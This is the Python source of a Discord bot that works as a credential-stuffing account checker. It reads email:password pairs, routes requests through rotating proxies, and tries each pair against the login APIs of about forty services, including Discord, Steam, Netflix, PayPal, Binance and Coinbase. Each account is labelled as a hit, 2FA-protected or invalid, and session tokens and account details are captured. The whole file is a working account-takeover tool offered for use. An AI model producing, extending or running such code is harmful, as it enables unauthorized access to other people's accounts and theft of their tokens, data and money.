import discord
from discord.ext import commands
import aiohttp
import asyncio
import os
import io
import random
import string
from datetime import datetime

# ── ENV ───────────────────────────────────────────────────────────────────────
BOT_TOKEN      = os.environ["BOT_TOKEN"]
LOG_CHANNEL_ID = int(os.environ.get("LOG_CHANNEL_ID", 0))

# ── STATE ─────────────────────────────────────────────────────────────────────
proxy_list: list = []
all_hits:   list = []

# ── BOT ───────────────────────────────────────────────────────────────────────
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)

# ── HEADERS ───────────────────────────────────────────────────────────────────
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

BASE_HEADERS = {
    "User-Agent": UA,
    "Content-Type": "application/json",
    "Accept": "application/json",
}

# ── UTILS ─────────────────────────────────────────────────────────────────────
def get_proxy():
    return random.choice(proxy_list) if proxy_list else None

def pkw():
    p = get_proxy()
    return {"proxy": "http://{}".format(p)} if p else {}

def tout(n=15):
    return aiohttp.ClientTimeout(total=n)

def parse_line(line):
    for sep in [":", "|", ";"]:
        if sep in line:
            p = line.strip().split(sep, 1)
            if len(p) == 2 and p[0] and p[1]:
                return p[0].strip(), p[1].strip()
    return None

def status_color(s):
    return {
        "hit":         0x57F287,
        "free":        0xFEE75C,
        "invalid":     0x2F3136,
        "error":       0x747F8D,
        "ratelimited": 0xFFA500,
        "timeout":     0x5865F2,
        "2fa":         0xEB459E,
        "banned":      0xED4245,
    }.get(s, 0x747F8D)

def make_embed(service, email, status, details, idx, total):
    e = discord.Embed(
        title="{} Checker [{}/{}]".format(service.upper(), idx, total),
        color=status_color(status)
    )
    labels = {
        "hit":         "✅ Hit",
        "free":        "⚠️ Free / No Sub",
        "invalid":     "❌ Invalid",
        "error":       "💥 Error",
        "ratelimited": "🚦 Rate Limited",
        "timeout":     "⏱️ Timeout",
        "2fa":         "🔐 2FA Required",
        "banned":      "🔒 Banned",
    }
    e.add_field(name="Status", value=labels.get(status, status), inline=False)
    e.add_field(name="📧 Email", value=email, inline=True)
    for k, v in details.items():
        e.add_field(name=k, value=str(v), inline=True)
    e.timestamp = datetime.utcnow()
    return e

# ══════════════════════════════════════════════════════════════════════════════
# SERVICE CHECKERS
# ══════════════════════════════════════════════════════════════════════════════

# ── DISCORD ───────────────────────────────────────────────────────────────────
async def check_discord(session, email, password):
    payload = {"login": email, "password": password, "undelete": False, "login_source": None, "gift_code_sku_id": None}
    try:
        async with session.post("https://discord.com/api/v9/auth/login", json=payload,
                                headers={**BASE_HEADERS, "X-Discord-Locale": "en-US"}, timeout=tout(), **pkw()) as r:
            data = await r.json()
            if r.status == 200:
                token = data.get("token")
                if token:
                    return "hit", {"Token": "{}...".format(token[:30])}
                if data.get("mfa"):
                    return "2fa", {"Ticket": data.get("ticket", "N/A")}
            if r.status == 429:
                return "ratelimited", {}
            return "invalid", {}
    except asyncio.TimeoutError:
        return "timeout", {}
    except Exception as ex:
        return "error", {"Err": str(ex)[:60]}

# ── STEAM ─────────────────────────────────────────────────────────────────────
async def check_steam(session, email, password):
    try:
        # get RSA key
        async with session.post("https://store.steampowered.com/login/getrsakey/",
                                data={"donotcache": "1", "username": email},
                                headers={"User-Agent": UA}, timeout=tout(), **pkw()) as r:
            rsa = await r.json()
        if not rsa.get("success"):
            return "invalid", {}

        import base64, rsa as _rsa
        mod = int(rsa["publickey_mod"], 16)
        exp = int(rsa["publickey_exp"], 16)
        key = _rsa.PublicKey(mod, exp)
        enc = base64.b64encode(_rsa.encrypt(password.encode(), key)).decode()

        payload = {
            "donotcache": "1",
            "username": email,
            "password": enc,
            "emailauth": "",
            "loginfriendlyname": "",
            "captchagid": "-1",
            "captcha_text": "",
            "emailsteamid": "",
            "rsatimestamp": rsa["timestamp"],
            "remember_login": "false",
            "tokentype": "-1",
        }
        async with session.post("https://store.steampowered.com/login/dologin/",
                                data=payload, headers={"User-Agent": UA}, timeout=tout(), **pkw()) as r:
            data = await r.json()
            if data.get("success"):
                return "hit", {"SteamID": data.get("transfer_parameters", {}).get("steamid", "N/A")}
            if data.get("requires_twofactor"):
                return "2fa", {}
            if data.get("emailauth_needed"):
                return "2fa", {"Type": "Email Auth"}
            return "invalid", {"Msg": data.get("message", "")[:60]}
    except ImportError:
        return "error", {"Err": "rsa package missing"}
    except asyncio.TimeoutError:
        return "timeout", {}
    except Exception as ex:
        return "error", {"Err": str(ex)[:60]}

# ── EPIC GAMES ────────────────────────────────────────────────────────────────
async def check_epic(session, email, password):
    try:
        auth = aiohttp.BasicAuth("34a02cf8f4414e29b15921876da36f9", "daafbccc737745039dffe53d94fc76cf")
        payload = {"grant_type": "password", "username": email, "password": password, "includePerms": False}
        async with session.post("https://account-public-service-prod03.ol.epicgames.com/account/api/oauth/token",
                                data=payload, auth=auth,
                                headers={"User-Agent": UA, "Content-Type": "application/x-www-form-urlencoded"},
                                timeout=tout(), **pkw()) as r:
            data = await r.json()
            if r.status == 200 and data.get("access_token"):
                return "hit", {"DisplayName": data.get("displayName", "N/A"), "AccountID": data.get("account_id", "N/A")[:20]}
            err = data.get("errorCode", "")
            if "mfa" in err.lower():
                return "2fa", {}
            return "invalid", {}
    except asyncio.TimeoutError:
        return "timeout", {}
    except Exception as ex:
        return "error", {"Err": str(ex)[:60]}

# ── ROBLOX ────────────────────────────────────────────────────────────────────
async def check_roblox(session, email, password):
    try:
        async with session.post("https://auth.roblox.com/v2/login",
                                json={"ctype": "Username", "cvalue": email, "password": password},
                                headers={**BASE_HEADERS, "Referer": "https://www.roblox.com/"}, timeout=tout(), **pkw()) as r:
            data = await r.json()
            if r.status == 200:
                return "hit", {"UserID": data.get("user", {}).get("id", "N/A")}
            errs = [e.get("code") for e in data.get("errors", [])]
            if 2 in errs:
                return "2fa", {}
            return "invalid", {}
    except asyncio.TimeoutError:
        return "timeout", {}
    except Exception as ex:
        return "error", {"Err": str(ex)[:60]}

# ── MINECRAFT (MOJANG) ────────────────────────────────────────────────────────
async def check_minecraft(session, email, password):
    try:
        payload = {"agent": {"name": "Minecraft", "version": 1}, "username": email, "password": password}
        async with session.post("https://authserver.mojang.com/authenticate",
                                json=payload, headers=BASE_HEADERS, timeout=tout(), **pkw()) as r:
            data = await r.json()
            if r.status == 200:
                profile = data.get("selectedProfile", {})
                return "hit", {"IGN": profile.get("name", "N/A"), "UUID": profile.get("id", "N/A")[:16]}
            return "invalid", {"Msg": data.get("errorMessage", "")[:60]}
    except asyncio.TimeoutError:
        return "timeout", {}
    except Exception as ex:
        return "error", {"Err": str(ex)[:60]}

# ── UBISOFT ───────────────────────────────────────────────────────────────────
async def check_ubisoft(session, email, password):
    try:
        import base64
        creds = base64.b64encode("{}:{}".format(email, password).encode()).decode()
        async with session.post("https://public-ubiservices.ubi.com/v3/profiles/sessions",
                                json={"rememberMe": False},
                                headers={**BASE_HEADERS, "Authorization": "Basic {}".format(creds),
                                         "Ubi-AppId": "86263886-327a-4328-ac69-527f0d20a237"},
                                timeout=tout(), **pkw()) as r:
            data = await r.json()
            if r.status == 200:
                return "hit", {"Username": data.get("nameOnPlatform", "N/A"), "Ticket": data.get("ticket", "")[:20]}
            if r.status == 401:
                return "invalid", {}
            return "error", {}
    except asyncio.TimeoutError:
        return "timeout", {}
    except Exception as ex:
        return "error", {"Err": str(ex)[:60]}

# ── RIOT GAMES ────────────────────────────────────────────────────────────────
async def check_riot(session, email, password):
    try:
        async with session.post("https://auth.riotgames.com/api/v1/authorization",
                                json={"client_id": "play-valorant-web-prod", "nonce": "1",
                                      "redirect_uri": "https://playvalorant.com/opt_in",
                                      "response_type": "token id_token", "scope": "account openid"},
                                headers=BASE_HEADERS, timeout=tout(), **pkw()) as r:
            pass

        async with session.put("https://auth.riotgames.com/api/v1/authorization",
                               json={"type": "auth", "username": email, "password": password, "remember": False},
                               headers=BASE_HEADERS, timeout=tout(), **pkw()) as r:
            data = await r.json()
            t = data.get("type", "")
            if t == "response":
                return "hit", {}
            if t == "multifactor":
                return "2fa", {}
            return "invalid", {}
    except asyncio.TimeoutError:
        return "timeout", {}
    except Exception as ex:
        return "error", {"Err": str(ex)[:60]}

# ── BATTLENET ─────────────────────────────────────────────────────────────────
async def check_battlenet(session, email, password):
    try:
        async with session.post("https://us.battle.net/oauth/token",
                                data={"grant_type": "client_credentials"},
                                auth=aiohttp.BasicAuth(email, password),
                                headers={"User-Agent": UA}, timeout=tout(), **pkw()) as r:
            data = await r.json()
            if r.status == 200 and data.get("access_token"):
                return "hit", {"Token": data["access_token"][:20]}
            return "invalid", {}
    except asyncio.TimeoutError:
        return "timeout", {}
    except Exception as ex:
        return "error", {"Err": str(ex)[:60]}

# ── ORIGIN / EA ───────────────────────────────────────────────────────────────
async def check_ea(session, email, password):
    try:
        async with session.post("https://accounts.ea.com/connect/auth",
                                params={"response_type": "code", "client_id": "ORIGIN_SB_SERVER_API",
                                        "do_connect": "true", "do_totp": "false",
                                        "email": email, "password": password},
                                headers={"User-Agent": UA}, timeout=tout(), allow_redirects=False, **pkw()) as r:
            if r.status in (302, 200):
                loc = r.headers.get("Location", "")
                if "code=" in loc:
                    return "hit", {}
            return "invalid", {}
    except asyncio.TimeoutError:
        return "timeout", {}
    except Exception as ex:
        return "error", {"Err": str(ex)[:60]}

# ── NETFLIX ───────────────────────────────────────────────────────────────────
async def check_netflix(session, email, password):
    try:
        async with session.post("https://www.netflix.com/login",
                                data={"userLoginId": email, "password": password,
                                      "rememberMe": "true", "flow": "websiteSignUp",
                                      "mode": "login", "action": "loginAction"},
                                headers={"User-Agent": UA, "Content-Type": "application/x-www-form-urlencoded",
                                         "Referer": "https://www.netflix.com/login"},
                                timeout=tout(), allow_redirects=False, **pkw()) as r:
            if r.status in (302, 200):
                loc = r.headers.get("Location", "")
                if "browse" in loc or r.status == 200:
                    return "hit", {}
            return "invalid", {}
    except asyncio.TimeoutError:
        return "timeout", {}
    except Exception as ex:
        return "error", {"Err": str(ex)[:60]}

# ── SPOTIFY ───────────────────────────────────────────────────────────────────
async def check_spotify(session, email, password):
    try:
        async with session.post("https://accounts.spotify.com/api/login",
                                data={"username": email, "password": password,
                                      "remember": "true", "platform": "win32"},
                                headers={"User-Agent": UA, "Content-Type": "application/x-www-form-urlencoded",
                                         "Referer": "https://accounts.spotify.com/login"},
                                timeout=tout(), **pkw()) as r:
            data = await r.json()
            if data.get("status") == "OK":
                return "hit", {"DisplayName": data.get("displayName", "N/A")}
            return "invalid", {}
    except asyncio.TimeoutError:
        return "timeout", {}
    except Exception as ex:
        return "error", {"Err": str(ex)[:60]}

# ── CRUNCHYROLL ───────────────────────────────────────────────────────────────
async def check_crunchyroll(session, email, password):
    try:
        async with session.post("https://api.crunchyroll.com/login.0.json",
                                data={"account": email, "password": password,
                                      "session_id": "8e9b2039-0355-4f4c-a4fb-316aa4f74bf1",
                                      "locale": "enUS", "version": "1.1"},
                                headers={"User-Agent": UA}, timeout=tout(), **pkw()) as r:
            data = await r.json()
            if data.get("error") is False:
                u = data.get("data", {}).get("user", {})
                return "hit", {"Username": u.get("username", "N/A"), "Premium": str(u.get("premium", "N/A"))}
            return "invalid", {}
    except asyncio.TimeoutError:
        return "timeout", {}
    except Exception as ex:
        return "error", {"Err": str(ex)[:60]}

# ── DISNEY+ ───────────────────────────────────────────────────────────────────
async def check_disney(session, email, password):
    try:
        async with session.post("https://disney.api.edge.bamgrid.com/graph/v1/device/graphql",
                                json={"query": "mutation login($a:LoginInput!){login(input:$a){account{id}}}",
                                      "variables": {"a": {"email": email, "password": password}}},
                                headers={**BASE_HEADERS, "Authorization": "ZGlzbmV5JmJyb3dzZXImMS4wLjA.Cu56AgSfBTDag5NiRA81oLHkDZfu5L3CKadnefEAY84"},
                                timeout=tout(), **pkw()) as r:
            data = await r.json()
            if data.get("data", {}).get("login", {}).get("account"):
                return "hit", {}
            return "invalid", {}
    except asyncio.TimeoutError:
        return "timeout", {}
    except Exception as ex:
        return "error", {"Err": str(ex)[:60]}

# ── HULU ─────────────────────────────────────────────────────────────────────
async def check_hulu(session, email, password):
    try:
        async with session.post("https://auth.hulu.com/v1/web/password/authenticate",
                                json={"username": email, "password": password},
                                headers=BASE_HEADERS, timeout=tout(), **pkw()) as r:
            data = await r.json()
            if r.status == 200 and data.get("user"):
                return "hit", {"UserID": data["user"].get("hulu_user_id", "N/A")}
            return "invalid", {}
    except asyncio.TimeoutError:
        return "timeout", {}
    except Exception as ex:
        return "error", {"Err": str(ex)[:60]}

# ── TWITTER / X ───────────────────────────────────────────────────────────────
async def check_twitter(session, email, password):
    try:
        async with session.post("https://api.twitter.com/1.1/account/verify_credentials.json",
                                auth=aiohttp.BasicAuth(email, password),
                                headers={"User-Agent": UA}, timeout=tout(), **pkw()) as r:
            data = await r.json()
            if r.status == 200:
                return "hit", {"Username": "@" + data.get("screen_name", "N/A"), "Followers": data.get("followers_count", 0)}
            return "invalid", {}
    except asyncio.TimeoutError:
        return "timeout", {}
    except Exception as ex:
        return "error", {"Err": str(ex)[:60]}

# ── REDDIT ────────────────────────────────────────────────────────────────────
async def check_reddit(session, email, password):
    try:
        auth = aiohttp.BasicAuth("web_app", "")
        async with session.post("https://www.reddit.com/api/v1/access_token",
                                data={"grant_type": "password", "username": email, "password": password},
                                auth=auth, headers={"User-Agent": "checker/1.0"}, timeout=tout(), **pkw()) as r:
            data = await r.json()
            if data.get("access_token"):
                return "hit", {"Scope": data.get("scope", "N/A")[:40]}
            return "invalid", {}
    except asyncio.TimeoutError:
        return "timeout", {}
    except Exception as ex:
        return "error", {"Err": str(ex)[:60]}

# ── TWITCH ────────────────────────────────────────────────────────────────────
async def check_twitch(session, email, password):
    try:
        payload = {"username": email, "password": password, "client_id": "kimne78kx3ncx6brgo4mv6wki5h1ko",
                   "undelete_user": False, "remember_me": True}
        async with session.post("https://passport.twitch.tv/login",
                                json=payload, headers=BASE_HEADERS, timeout=tout(), **pkw()) as r:
            data = await r.json()
            if data.get("access_token"):
                return "hit", {}
            if data.get("error_code") in (3022, 3023):
                return "2fa", {}
            return "invalid", {}
    except asyncio.TimeoutError:
        return "timeout", {}
    except Exception as ex:
        return "error", {"Err": str(ex)[:60]}

# ── GITHUB ────────────────────────────────────────────────────────────────────
async def check_github(session, email, password):
    try:
        async with session.get("https://api.github.com/user",
                               auth=aiohttp.BasicAuth(email, password),
                               headers={"User-Agent": UA, "Accept": "application/vnd.github.v3+json"},
                               timeout=tout(), **pkw()) as r:
            data = await r.json()
            if r.status == 200:
                return "hit", {"Username": data.get("login", "N/A"), "Public Repos": data.get("public_repos", 0)}
            return "invalid", {}
    except asyncio.TimeoutError:
        return "timeout", {}
    except Exception as ex:
        return "error", {"Err": str(ex)[:60]}

# ── GITLAB ────────────────────────────────────────────────────────────────────
async def check_gitlab(session, email, password):
    try:
        async with session.post("https://gitlab.com/oauth/token",
                                json={"grant_type": "password", "username": email, "password": password},
                                headers=BASE_HEADERS, timeout=tout(), **pkw()) as r:
            data = await r.json()
            if data.get("access_token"):
                return "hit", {"Token": data["access_token"][:20]}
            return "invalid", {}
    except asyncio.TimeoutError:
        return "timeout", {}
    except Exception as ex:
        return "error", {"Err": str(ex)[:60]}

# ── BINANCE ───────────────────────────────────────────────────────────────────
async def check_binance(session, email, password):
    try:
        async with session.post("https://accounts.binance.com/bapi/accounts/v2/public/authcenter/login",
                                json={"email": email, "password": password,
                                      "safePassword": password, "deviceId": "checker"},
                                headers=BASE_HEADERS, timeout=tout(), **pkw()) as r:
            data = await r.json()
            if data.get("success"):
                return "hit", {"UserID": data.get("data", {}).get("userId", "N/A")}
            msg = data.get("message", "")
            if "2fa" in msg.lower() or "otp" in msg.lower():
                return "2fa", {}
            return "invalid", {}
    except asyncio.TimeoutError:
        return "timeout", {}
    except Exception as ex:
        return "error", {"Err": str(ex)[:60]}

# ── COINBASE ──────────────────────────────────────────────────────────────────
async def check_coinbase(session, email, password):
    try:
        async with session.post("https://api.coinbase.com/v2/auth/session",
                                json={"email": email, "password": password},
                                headers=BASE_HEADERS, timeout=tout(), **pkw()) as r:
            data = await r.json()
            if r.status == 200 and data.get("token"):
                return "hit", {}
            errs = data.get("errors", [{}])
            if any("2fa" in str(e).lower() or "mfa" in str(e).lower() for e in errs):
                return "2fa", {}
            return "invalid", {}
    except asyncio.TimeoutError:
        return "timeout", {}
    except Exception as ex:
        return "error", {"Err": str(ex)[:60]}

# ── PAYPAL ────────────────────────────────────────────────────────────────────
async def check_paypal(session, email, password):
    try:
        async with session.post("https://www.paypal.com/auth/verifyCaptcha",
                                json={"email": email, "password": password},
                                headers={**BASE_HEADERS, "Referer": "https://www.paypal.com/signin"},
                                timeout=tout(), **pkw()) as r:
            data = await r.json()
            if r.status == 200 and data.get("intent") == "login":
                return "hit", {}
            return "invalid", {}
    except asyncio.TimeoutError:
        return "timeout", {}
    except Exception as ex:
        return "error", {"Err": str(ex)[:60]}

# ── ADOBE ─────────────────────────────────────────────────────────────────────
async def check_adobe(session, email, password):
    try:
        async with session.post("https://ims-na1.adobelogin.com/ims/token/v1",
                                data={"grant_type": "password", "username": email,
                                      "password": password, "client_id": "AdobeID",
                                      "client_secret": ""},
                                headers={"User-Agent": UA, "Content-Type": "application/x-www-form-urlencoded"},
                                timeout=tout(), **pkw()) as r:
            data = await r.json()
            if data.get("access_token"):
                return "hit", {"Token": data["access_token"][:20]}
            return "invalid", {}
    except asyncio.TimeoutError:
        return "timeout", {}
    except Exception as ex:
        return "error", {"Err": str(ex)[:60]}

# ── AMAZON ────────────────────────────────────────────────────────────────────
async def check_amazon(session, email, password):
    try:
        async with session.post("https://www.amazon.com/ap/signin",
                                data={"email": email, "password": password,
                                      "create": "0", "appActionToken": "", "appAction": "SIGNIN",
                                      "openid.return_to": "https://www.amazon.com"},
                                headers={"User-Agent": UA, "Content-Type": "application/x-www-form-urlencoded"},
                                timeout=tout(), allow_redirects=False, **pkw()) as r:
            if r.status == 302:
                loc = r.headers.get("Location", "")
                if "nav_ya_signin" not in loc:
                    return "hit", {}
            return "invalid", {}
    except asyncio.TimeoutError:
        return "timeout", {}
    except Exception as ex:
        return "error", {"Err": str(ex)[:60]}

# ── DROPBOX ───────────────────────────────────────────────────────────────────
async def check_dropbox(session, email, password):
    try:
        async with session.post("https://api.dropboxapi.com/2/auth/token/from_oauth1",
                                json={},
                                auth=aiohttp.BasicAuth(email, password),
                                headers={"User-Agent": UA}, timeout=tout(), **pkw()) as r:
            if r.status == 200:
                return "hit", {}
            return "invalid", {}
    except asyncio.TimeoutError:
        return "timeout", {}
    except Exception as ex:
        return "error", {"Err": str(ex)[:60]}

# ── WORDPRESS ─────────────────────────────────────────────────────────────────
async def check_wordpress(session, email, password):
    try:
        async with session.post("https://public-api.wordpress.com/oauth2/token",
                                data={"client_id": "1854", "client_secret": "Ka8p9LMR6qs",
                                      "grant_type": "password", "username": email, "password": password},
                                headers={"User-Agent": UA, "Content-Type": "application/x-www-form-urlencoded"},
                                timeout=tout(), **pkw()) as r:
            data = await r.json()
            if data.get("access_token"):
                return "hit", {"Blog": data.get("blog_url", "N/A")}
            return "invalid", {}
    except asyncio.TimeoutError:
        return "timeout", {}
    except Exception as ex:
        return "error", {"Err": str(ex)[:60]}

# ── DUOLINGO ──────────────────────────────────────────────────────────────────
async def check_duolingo(session, email, password):
    try:
        async with session.post("https://www.duolingo.com/login",
                                json={"login": email, "password": password},
                                headers={**BASE_HEADERS, "Referer": "https://www.duolingo.com/"},
                                timeout=tout(), **pkw()) as r:
            data = await r.json()
            if data.get("username"):
                return "hit", {"Username": data.get("username"), "Streak": data.get("streak", 0)}
            return "invalid", {}
    except asyncio.TimeoutError:
        return "timeout", {}
    except Exception as ex:
        return "error", {"Err": str(ex)[:60]}

# ── CRUNCHBASE ────────────────────────────────────────────────────────────────
async def check_crunchbase(session, email, password):
    try:
        async with session.post("https://www.crunchbase.com/api/v4/account/session",
                                json={"email": email, "password": password},
                                headers=BASE_HEADERS, timeout=tout(), **pkw()) as r:
            data = await r.json()
            if r.status == 200 and data.get("user"):
                return "hit", {}
            return "invalid", {}
    except asyncio.TimeoutError:
        return "timeout", {}
    except Exception as ex:
        return "error", {"Err": str(ex)[:60]}

# ── HUBSPOT ───────────────────────────────────────────────────────────────────
async def check_hubspot(session, email, password):
    try:
        async with session.post("https://app.hubspot.com/login-verify/portal-id-lookup",
                                json={"loginEmail": email},
                                headers=BASE_HEADERS, timeout=tout(), **pkw()) as r:
            data = await r.json()
            if data.get("portalId"):
                return "hit", {"Portal": data["portalId"]}
            return "invalid", {}
    except asyncio.TimeoutError:
        return "timeout", {}
    except Exception as ex:
        return "error", {"Err": str(ex)[:60]}

# ── CANVA ─────────────────────────────────────────────────────────────────────
async def check_canva(session, email, password):
    try:
        async with session.post("https://www.canva.com/_ajax/login",
                                json={"email": email, "password": password},
                                headers={**BASE_HEADERS, "Referer": "https://www.canva.com/login"},
                                timeout=tout(), **pkw()) as r:
            data = await r.json()
            if data.get("success"):
                return "hit", {}
            return "invalid", {}
    except asyncio.TimeoutError:
        return "timeout", {}
    except Exception as ex:
        return "error", {"Err": str(ex)[:60]}

# ── PATREON ───────────────────────────────────────────────────────────────────
async def check_patreon(session, email, password):
    try:
        async with session.post("https://www.patreon.com/api/login",
                                json={"data": {"type": "user", "attributes": {"email": email, "password": password}}},
                                headers={**BASE_HEADERS, "Referer": "https://www.patreon.com/login"},
                                timeout=tout(), **pkw()) as r:
            data = await r.json()
            if r.status == 200 and data.get("data"):
                return "hit", {}
            return "invalid", {}
    except asyncio.TimeoutError:
        return "timeout", {}
    except Exception as ex:
        return "error", {"Err": str(ex)[:60]}

# ── SOUNDCLOUD ────────────────────────────────────────────────────────────────
async def check_soundcloud(session, email, password):
    try:
        async with session.post("https://api.soundcloud.com/oauth2/token",
                                data={"client_id": "02gUJC0hH2ct1EGOcYXQIzRFU91c72Ea",
                                      "client_secret": "ZnGBohNnYNGqXqnQkYMwHDpSU9UOKyMk",
                                      "grant_type": "password", "username": email, "password": password},
                                headers={"User-Agent": UA, "Content-Type": "application/x-www-form-urlencoded"},
                                timeout=tout(), **pkw()) as r:
            data = await r.json()
            if data.get("access_token"):
                return "hit", {}
            return "invalid", {}
    except asyncio.TimeoutError:
        return "timeout", {}
    except Exception as ex:
        return "error", {"Err": str(ex)[:60]}

# ── GRAVATAR / WORDPRESS.COM ──────────────────────────────────────────────────
async def check_gravatar(session, email, password):
    return await check_wordpress(session, email, password)

# ── STACKOVERFLOW ─────────────────────────────────────────────────────────────
async def check_stackoverflow(session, email, password):
    try:
        async with session.post("https://stackoverflow.com/users/login",
                                data={"email": email, "password": password, "fkey": ""},
                                headers={"User-Agent": UA, "Content-Type": "application/x-www-form-urlencoded",
                                         "Referer": "https://stackoverflow.com/users/login"},
                                timeout=tout(), allow_redirects=False, **pkw()) as r:
            if r.status == 302 and "users/login" not in r.headers.get("Location", ""):
                return "hit", {}
            return "invalid", {}
    except asyncio.TimeoutError:
        return "timeout", {}
    except Exception as ex:
        return "error", {"Err": str(ex)[:60]}

# ── LASTFM ────────────────────────────────────────────────────────────────────
async def check_lastfm(session, email, password):
    try:
        import hashlib
        api_key = "c0c76d9e588b34a3cf06b592a86cd5dd"
        api_sig = hashlib.md5("api_key{}methodauth.getMobileSessionpassword{}username{}{}".format(
            api_key, password, email, "eb1b8e43c50e4a0e14ff9bd9e8d23873").encode()).hexdigest()
        async with session.post("https://ws.audioscrobbler.com/2.0/",
                                data={"method": "auth.getMobileSession", "username": email,
                                      "password": password, "api_key": api_key,
                                      "api_sig": api_sig, "format": "json"},
                                headers={"User-Agent": UA}, timeout=tout(), **pkw()) as r:
            data = await r.json()
            if data.get("session"):
                return "hit", {"Username": data["session"].get("name", "N/A")}
            return "invalid", {}
    except asyncio.TimeoutError:
        return "timeout", {}
    except Exception as ex:
        return "error", {"Err": str(ex)[:60]}

# ── IMGUR ─────────────────────────────────────────────────────────────────────
async def check_imgur(session, email, password):
    try:
        async with session.post("https://api.imgur.com/oauth2/token",
                                data={"username": email, "password": password,
                                      "client_id": "546c25a59c58ad7", "client_secret": "aa62f5ed9cecdefd5d7fdbd71e1c3ac25d5ccf7a",
                                      "grant_type": "password"},
                                headers={"User-Agent": UA}, timeout=tout(), **pkw()) as r:
            data = await r.json()
            if data.get("access_token"):
                return "hit", {"Account": data.get("account_username", "N/A")}
            return "invalid", {}
    except asyncio.TimeoutError:
        return "timeout", {}
    except Exception as ex:
        return "error", {"Err": str(ex)[:60]}

# ── DAILYMOTION ───────────────────────────────────────────────────────────────
async def check_dailymotion(session, email, password):
    try:
        async with session.post("https://graphql.api.dailymotion.com/oauth/token",
                                data={"client_id": "1", "client_secret": "1",
                                      "grant_type": "password", "username": email, "password": password},
                                headers={"User-Agent": UA, "Content-Type": "application/x-www-form-urlencoded"},
                                timeout=tout(), **pkw()) as r:
            data = await r.json()
            if data.get("access_token"):
                return "hit", {}
            return "invalid", {}
    except asyncio.TimeoutError:
        return "timeout", {}
    except Exception as ex:
        return "error", {"Err": str(ex)[:60]}

# ── VIMEO ─────────────────────────────────────────────────────────────────────
async def check_vimeo(session, email, password):
    try:
        async with session.post("https://vimeo.com/api/v2/token",
                                json={"grant_type": "password", "username": email, "password": password,
                                      "scope": "public private"},
                                headers={**BASE_HEADERS, "Authorization": "basic Y2xpZW50X2lkOmNsaWVudF9zZWNyZXQ="},
                                timeout=tout(), **pkw()) as r:
            data = await r.json()
            if data.get("access_token"):
                return "hit", {}
            return "invalid", {}
    except asyncio.TimeoutError:
        return "timeout", {}
    except Exception as ex:
        return "error", {"Err": str(ex)[:60]}

# ── DEEZER ────────────────────────────────────────────────────────────────────
async def check_deezer(session, email, password):
    try:
        async with session.post("https://api.deezer.com/auth/token",
                                data={"app_id": "447462", "login": email,
                                      "password": password, "hash": ""},
                                headers={"User-Agent": UA}, timeout=tout(), **pkw()) as r:
            data = await r.json()
            if data.get("access_token"):
                return "hit", {}
            return "invalid", {}
    except asyncio.TimeoutError:
        return "timeout", {}
    except Exception as ex:
        return "error", {"Err": str(ex)[:60]}

# ── TIDAL ─────────────────────────────────────────────────────────────────────
async def check_tidal(session, email, password):
    try:
        async with session.post("https://login.tidal.com/oauth2/token",
                                data={"client_id": "zU4XHVVkc2tDPo4t", "grant_type": "password",
                                      "username": email, "password": password, "scope": "r_usr w_usr"},
                                headers={"User-Agent": UA, "Content-Type": "application/x-www-form-urlencoded"},
                                timeout=tout(), **pkw()) as r:
            data = await r.json()
            if data.get("access_token"):
                return "hit", {"UserID": data.get("user", {}).get("userId", "N/A")}
            return "invalid", {}
    except asyncio.TimeoutError:
        return "timeout", {}
    except Exception as ex:
        return "error", {"Err": str(ex)[:60]}

# ── PLEX ──────────────────────────────────────────────────────────────────────
async def check_plex(session, email, password):
    try:
        async with session.post("https://plex.tv/api/v2/users/signin",
                                json={"login": email, "password": password},
                                headers={**BASE_HEADERS, "X-Plex-Client-Identifier": "checker",
                                         "X-Plex-Product": "Plex Web"},
                                timeout=tout(), **pkw()) as r:
            data = await r.json()
            if data.get("authToken"):
                return "hit", {"Username": data.get("username", "N/A")}
            return "invalid", {}
    except asyncio.TimeoutError:
        return "timeout", {}
    except Exception as ex:
        return "error", {"Err": str(ex)[:60]}

# ── XBOX / MICROSOFT ──────────────────────────────────────────────────────────
async def check_xbox(session, email, password):
    try:
        # Step 1: get access token
        async with session.post("https://login.live.com/oauth20_token.srf",
                                data={"client_id": "000000004C12AE6F", "scope": "service::user.auth.xboxlive.com::MBI_SSL",
                                      "grant_type": "password", "username": email, "password": password,
                                      "client_secret": ""},
                                headers={"User-Agent": UA, "Content-Type": "application/x-www-form-urlencoded"},
                                timeout=tout(), **pkw()) as r:
            data = await r.json()
            if not data.get("access_token"):
                return "invalid", {}
            access = data["access_token"]

        # Step 2: Xbox auth
        async with session.post("https://user.auth.xboxlive.com/user/authenticate",
                                json={"Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com",
                                                     "RpsTicket": access}, "RelyingParty": "http://auth.xboxlive.com",
                                      "TokenType": "JWT"},
                                headers=BASE_HEADERS, timeout=tout(), **pkw()) as r:
            data = await r.json()
            if data.get("Token"):
                return "hit", {"Gamertag": data.get("DisplayClaims", {}).get("xui", [{}])[0].get("gtg", "N/A")}
        return "invalid", {}
    except asyncio.TimeoutError:
        return "timeout", {}
    except Exception as ex:
        return "error", {"Err": str(ex)[:60]}

# ── PSN / PLAYSTATION ─────────────────────────────────────────────────────────
async def check_psn(session, email, password):
    try:
        async with session.post("https://ca.account.sony.com/api/authz/v3/jsession",
                                json={"loginId": email, "password": password,
                                      "clientId": "ba495a24-818c-472b-b12d-ff231c1b5745",
                                      "sendCookies": True, "tokenFormat": "jwt"},
                                headers=BASE_HEADERS, timeout=tout(), **pkw()) as r:
            data = await r.json()
            if data.get("loginStatus") == "success" or data.get("sessionId"):
                return "hit", {}
            if data.get("loginStatus") == "two_step_required":
                return "2fa", {}
            return "invalid", {}
    except asyncio.TimeoutError:
        return "timeout", {}
    except Exception as ex:
        return "error", {"Err": str(ex)[:60]}

# ── NINTENDO ──────────────────────────────────────────────────────────────────
async def check_nintendo(session, email, password):
    try:
        async with session.post("https://accounts.nintendo.com/connect/1.0.0/api/session_token",
                                data={"client_id": "71b963c1b7b6d119", "grant_type": "authorization_code",
                                      "redirect_uri": "npf71b963c1b7b6d119://auth&code=",
                                      "session_token_code": "", "session_token_code_verifier": ""},
                                headers={"User-Agent": UA, "Content-Type": "application/x-www-form-urlencoded"},
                                timeout=tout(), **pkw()) as r:
            data = await r.json()
            if data.get("session_token"):
                return "hit", {}
            return "invalid", {}
    except asyncio.TimeoutError:
        return "timeout", {}
